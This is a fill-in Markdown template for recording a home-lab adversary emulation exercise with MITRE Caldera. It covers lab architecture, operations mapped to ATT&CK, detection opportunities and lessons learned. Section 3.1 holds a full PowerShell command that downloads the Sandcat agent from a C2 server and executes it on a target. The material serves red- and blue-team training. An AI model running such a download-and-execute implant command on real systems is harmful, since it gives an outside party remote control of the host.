# Caldera Adversary Emulation — Home Lab Documentation

> **Author:** [Your Name]
> **Lab Environment:** Home Lab
> **Caldera Version:** [e.g., 5.x]
> **Last Updated:** [Date]

---

## Table of Contents

1. [Lab Setup & Architecture](#1-lab-setup--architecture)
2. [Caldera Server Configuration](#2-caldera-server-configuration)
3. [Agent Deployment](#3-agent-deployment)
4. [Operations & Campaigns](#4-operations--campaigns)
5. [TTPs & MITRE ATT&CK Mapping](#5-ttps--mitre-attck-mapping)
6. [Findings & Observations](#6-findings--observations)
7. [Detection Opportunities](#7-detection-opportunities)
8. [Lessons Learned](#8-lessons-learned)
9. [References](#9-references)

---

## 1. Lab Setup & Architecture

### 1.1 Network Topology

```
[Attacker / C2 Host]          [Victim Network Segment]
+--------------------+         +------------------------+
|  Caldera Server    |<------->|  Windows 10 Target     |
|  IP: 192.168.x.x  |         |  IP: 192.168.x.x       |
|  OS: Ubuntu 22.04  |         +------------------------+
+--------------------+         +------------------------+
                               |  Windows Server 2019   |
                               |  IP: 192.168.x.x       |
                               +------------------------+
                               +------------------------+
                               |  Kali / Linux Target   |
                               |  IP: 192.168.x.x       |
                               +------------------------+
```

> **Note:** Update the diagram to match your actual topology. Add/remove hosts as needed.

### 1.2 Host Inventory

| Hostname | Role | OS | IP Address | Notes |
|----------|------|----|------------|-------|
| caldera-srv | C2 / Attacker | Ubuntu 22.04 LTS | 192.168.x.x | Caldera server |
| win10-victim | Target | Windows 10 22H2 | 192.168.x.x | Agent deployed |
| winsvr-victim | Target | Windows Server 2019 | 192.168.x.x | Domain controller |
| kali-target | Target | Kali Linux | 192.168.x.x | Optional |

### 1.3 Network Segmentation

- **Hypervisor:** [VMware Workstation / VirtualBox / Proxmox / Hyper-V]
- **Virtual Switch / Adapter:** [e.g., Host-Only, NAT, Internal]
- **Internet access from victim hosts:** [Yes / No — describe any firewall rules]
- **Isolation notes:** [e.g., "Victim segment has no internet egress; DNS only to lab DC"]

---

## 2. Caldera Server Configuration

### 2.1 Installation

```bash
# Example — update with your actual install steps
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt
python3 server.py --insecure
```

- **Install method:** [Git clone / Docker / pip]
- **Plugins enabled:**
  - [ ] Stockpile
  - [ ] Sandcat (GoLang agent)
  - [ ] Manx (TCP/UDP agent)
  - [ ] Atomic (Atomic Red Team integration)
  - [ ] Access (RAT plugin)
  - [ ] SSL/TLS enabled: [Yes / No]

### 2.2 Configuration File Changes (`conf/local.yml`)

```yaml
# Document any non-default settings you changed
port: 8888
app.contact.http: http://192.168.x.x:8888
app.contact.tcp: 192.168.x.x:7010
users:
  red: <redacted>
  blue: <redacted>
```

### 2.3 Adversary Profiles Used

| Profile Name | Source | Description |
|---|---|---|
| [e.g., Discovery] | Built-in | Basic host/network discovery |
| [e.g., Nosy Neighbor] | Stockpile | Lateral movement & credential access |
| [e.g., Custom Profile] | Custom | [Brief description] |

---

## 3. Agent Deployment

### 3.1 Sandcat Agent (GoLang)

**Deployment command used on target:**

```powershell
# Windows — PowerShell example
$server = "http://192.168.x.x:8888";
$url = "$server/file/download";
$wc = New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go-windows");
$data = $wc.DownloadData($url);
$name = $server.split("/")[-1];
get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;
rm -force "C:\Users\Public\$name.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;
Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server $server -group red" -PassThru | Out-Null;
```

**Agent configuration:**

| Setting | Value |
|---|---|
| C2 Contact Method | HTTP / TCP / UDP |
| Beacon Interval | [e.g., 60 seconds] |
| Agent Group | [e.g., red] |
| Jitter | [e.g., 30 seconds] |
| Implant PID | [noted at runtime] |

### 3.2 Observed Agent Behavior

- Initial beacon observed at: [timestamp]
- Agent appeared in Caldera UI under group: [group name]
- Agent ran as user: [e.g., SYSTEM / standard user / admin]
- Privilege level: [Low / Medium / High / SYSTEM]

---

## 4. Operations & Campaigns

---

### Operation 1: [Operation Name]

**Date:** [YYYY-MM-DD]
**Duration:** [e.g., 45 minutes]
**Adversary Profile:** [Profile name]
**Target Host(s):** [Hostname(s)]
**Objective:** [e.g., Simulate initial access, discovery, and credential dumping]

#### 4.1.1 Operation Configuration

| Setting | Value |
|---|---|
| Planner | [e.g., Sequential / Batch / Atomic] |
| Fact Source | [e.g., basic] |
| Obfuscation | [e.g., plain-text / base64] |
| Auto-close | [Yes / No] |

#### 4.1.2 Abilities Executed

| # | Ability Name | ATT&CK Technique | Tactic | Status | Notes |
|---|---|---|---|---|---|
| 1 | [e.g., Identify hostname] | T1082 | Discovery | ✅ Success | Output: `WIN10-VICTIM` |
| 2 | [e.g., Enumerate local users] | T1087.001 | Discovery | ✅ Success | Found 3 local accounts |
| 3 | [e.g., Dump lsass] | T1003.001 | Credential Access | ❌ Failed | AV blocked execution |
| 4 | [e.g., Lateral movement via PsExec] | T1021.002 | Lateral Movement | ✅ Success | Moved to WINSVR |

#### 4.1.3 Key Artifacts & Evidence

- **Agent output log location:** [path or UI export]
- **Interesting command outputs:**

```
# Paste relevant command outputs here
whoami /all
hostname
net user
```

- **Files dropped on target:** [list any dropped files, hashes if captured]
- **Network connections observed:** [source → dest, port, protocol]

#### 4.1.4 Operation Timeline

```
[HH:MM] - Agent beacon received
[HH:MM] - Ability 1 (Discovery) executed successfully
[HH:MM] - Ability 2 (Enum users) completed
[HH:MM] - Ability 3 (Cred dump) blocked by AV
[HH:MM] - Operation closed
```

---

### Operation 2: [Operation Name]

> *(Duplicate the section above for each additional operation)*

---

## 5. TTPs & MITRE ATT&CK Mapping

### 5.1 ATT&CK Techniques Observed

| ATT&CK ID | Technique Name | Tactic | Sub-technique | Tool/Ability | Outcome |
|---|---|---|---|---|---|
| T1059.001 | PowerShell | Execution | Yes | Sandcat | ✅ Executed |
| T1082 | System Information Discovery | Discovery | No | Built-in ability | ✅ Executed |
| T1087.001 | Local Account Discovery | Discovery | Yes | net user | ✅ Executed |
| T1003.001 | LSASS Memory | Credential Access | Yes | Caldera ability | ❌ Blocked |
| T1021.002 | SMB/Windows Admin Shares | Lateral Movement | Yes | PsExec ability | ✅ Executed |
| T1070.004 | File Deletion | Defense Evasion | Yes | Agent cleanup | ✅ Executed |
| T1105 | Ingress Tool Transfer | Command & Control | No | Sandcat download | ✅ Executed |

### 5.2 ATT&CK Navigator Layer

> Export your ATT&CK Navigator layer from the Caldera UI after each operation (**Results → Export → ATT&CK**) and store the JSON file alongside this document.

- Navigator JSON export: `[filename].json`
- Online viewer: [https://mitre-attack.github.io/attack-navigator/](https://mitre-attack.github.io/attack-navigator/)

### 5.3 Tactic Coverage Summary

| Tactic | # Techniques Tested | # Successful | # Blocked/Failed |
|---|---|---|---|
| Initial Access | 0 | 0 | 0 |
| Execution | 1 | 1 | 0 |
| Persistence | 0 | 0 | 0 |
| Privilege Escalation | 0 | 0 | 0 |
| Defense Evasion | 1 | 1 | 0 |
| Credential Access | 1 | 0 | 1 |
| Discovery | 2 | 2 | 0 |
| Lateral Movement | 1 | 1 | 0 |
| Collection | 0 | 0 | 0 |
| Command & Control | 1 | 1 | 0 |
| Exfiltration | 0 | 0 | 0 |
| Impact | 0 | 0 | 0 |

---

## 6. Findings & Observations

### 6.1 What Worked

- [e.g., Discovery abilities ran without any AV/EDR interference]
- [e.g., Lateral movement via SMB was undetected in Windows Event Logs initially]
- [e.g., Agent persistence survived a host reboot]

### 6.2 What Was Blocked or Failed

- [e.g., LSASS dump blocked by Windows Defender — `MpEngine` logged event ID 1116]
- [e.g., Mimikatz-based ability failed — rule triggered in Sysmon]
- [e.g., Base64 obfuscation didn't help against AMSI scanning]

### 6.3 Surprises / Unexpected Behavior

- [e.g., Agent beacon interval caused noticeable spike in DNS queries]
- [e.g., One ability generated a Windows Security event (4688) I wasn't monitoring]

---

## 7. Detection Opportunities

| Technique | Detection Method | Log Source | Event ID / Rule | Notes |
|---|---|---|---|---|
| T1059.001 PowerShell | Script block logging | Windows PowerShell log | Event 4104 | Requires PSScriptBlockLogging enabled |
| T1082 Sys Info Discovery | Process creation | Sysmon | Event ID 1 | `systeminfo.exe` or `hostname.exe` |
| T1003.001 LSASS Dump | AV/EDR alert | Windows Defender | Event 1116 | Blocked in this lab |
| T1021.002 SMB Lateral Mvmt | Network share access | Windows Security | Event 5140 | Admin$ share accessed |
| T1105 Tool Transfer | Network connection | Sysmon | Event ID 3 | Outbound HTTP to C2 IP |

### 7.1 SIEM / Logging Stack (if applicable)

- **SIEM:** [e.g., Elastic SIEM / Splunk Free / Wazuh / Graylog / None]
- **Log forwarder:** [e.g., Winlogbeat / Sysmon + NXLog / Wazuh agent]
- **Sysmon config used:** [e.g., SwiftOnSecurity / Olaf Hartong modular]
- **Alerts triggered during ops:** [List any SIEM alerts that fired]

---

## 8. Lessons Learned

### 8.1 Red Team Perspective

- [e.g., Need to tune beacon jitter to blend with normal traffic patterns]
- [e.g., Should test ability execution with different obfuscation methods]
- [e.g., Custom abilities needed for techniques not covered by Stockpile]

### 8.2 Blue Team / Detection Perspective

- [e.g., LSASS protection (PPL) should be enabled on all Windows hosts]
- [e.g., PowerShell script block logging was critical — caught encoded commands]
- [e.g., SMB lateral movement is noisy in Security logs if you're watching]

### 8.3 Lab Improvements for Next Time

- [ ] Enable Sysmon on all hosts before next operation
- [ ] Set up ATT&CK Navigator to track coverage over time
- [ ] Try the Atomic plugin to expand ability library
- [ ] Add a deception host (honeypot) to test lateral movement detection
- [ ] Enable network capture (Zeek / Wireshark) on the virtual switch

---

## 9. References

- [MITRE Caldera GitHub](https://github.com/mitre/caldera)
- [Caldera Documentation](https://caldera.readthedocs.io/)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)
- [Sysmon Config — SwiftOnSecurity](https://github.com/SwiftOnSecurity/sysmon-config)
- [Sysmon Config — Olaf Hartong](https://github.com/olafhartong/sysmon-modular)

---

*This document is for authorized home lab use only. All testing was conducted in an isolated environment.*
